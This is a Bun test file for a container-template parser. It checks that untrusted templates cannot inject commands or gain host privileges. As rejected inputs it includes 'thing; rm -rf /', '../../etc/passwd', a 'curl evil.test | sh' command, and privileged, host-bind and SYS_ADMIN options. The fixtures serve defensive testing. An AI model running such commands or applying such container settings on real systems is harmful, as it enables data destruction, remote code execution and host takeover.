import { describe, expect, test } from 'bun:test';
import { parseTemplate, TemplateError } from '../src/catalog/templates.ts';

/**
 * Templates from somewhere else.
 *
 * This file turns into a container running on somebody's server, and it came from the
 * internet. So the tests are almost entirely about what is refused, and about fields
 * being dropped rather than passed through: the difference between those two
 * positions is whether this is a feature or a vulnerability.
 */
const valid = {
  name: 'Something',
  image: 'ghcr.io/someone/thing:1.2',
  port: 8080,
};

describe('what is accepted', () => {
  test('the smallest usable template', () => {
    const template = parseTemplate(valid);
    expect(template.image).toBe('ghcr.io/someone/thing:1.2');
    expect(template.port).toBe(8080);
    expect(template.slug).toBe('something');
  });

  test('storage paths, variables and a note', () => {
    const template = parseTemplate({
      ...valid,
      volumes: ['/data', '/var/lib/thing'],
      env: { API_KEY: 'x', PUID: '1000' },
      afterDeploy: 'Sign in with admin/admin.',
    });
    expect(template.volumes).toEqual(['/data', '/var/lib/thing']);
    expect(template.env).toEqual({ API_KEY: 'x', PUID: '1000' });
    expect(template.afterDeploy).toContain('admin');
  });
});

describe('what is refused', () => {
  test('anything that is not a template at all', () => {
    for (const bad of [null, 'a string', 42, [], {}]) {
      expect(() => parseTemplate(bad)).toThrow(TemplateError);
    }
  });

  test('an image name that is not one', () => {
    for (const image of [
      '',
      'UPPERCASE',
      'thing; rm -rf /',
      '../../etc/passwd',
      'thing:tag with spaces',
      'x'.repeat(300),
    ]) {
      expect(() => parseTemplate({ ...valid, image })).toThrow(TemplateError);
    }
  });

  test('a port that is not one', () => {
    for (const port of [0, -1, 70000, 'eighty', null, 1.5]) {
      expect(() => parseTemplate({ ...valid, port })).toThrow(TemplateError);
    }
  });
});

describe('what is quietly dropped', () => {
  test('storage paths that are relative or try to climb out', () => {
    const template = parseTemplate({
      ...valid,
      volumes: ['/good', 'relative', '/bad/../../etc', '../escape'],
    });
    expect(template.volumes).toEqual(['/good']);
  });

  test('variable names that are not variable names', () => {
    const template = parseTemplate({
      ...valid,
      env: { GOOD: 'yes', 'bad name': 'no', '9BAD': 'no', 'BAD;': 'no' },
    });
    expect(template.env).toEqual({ GOOD: 'yes' });
  });

  test('every field Derailed does not define', () => {
    // Not passed through on the chance it might be useful. A template able to set
    // arbitrary Docker options would be a polite way to hand over a root shell.
    const template = parseTemplate({
      ...valid,
      privileged: true,
      command: ['sh', '-c', 'curl evil.test | sh'],
      HostConfig: { Binds: ['/:/host'] },
      capAdd: ['SYS_ADMIN'],
      network: 'host',
    }) as unknown as Record<string, unknown>;

    for (const field of ['privileged', 'HostConfig', 'capAdd', 'network', 'command']) {
      expect(template[field]).toBeUndefined();
    }
  });

  test('a category of its own choosing', () => {
    // A template does not get to invent a category and rearrange the catalogue.
    expect(parseTemplate({ ...valid, category: 'Featured' }).category).toBe('Tools');
  });
});
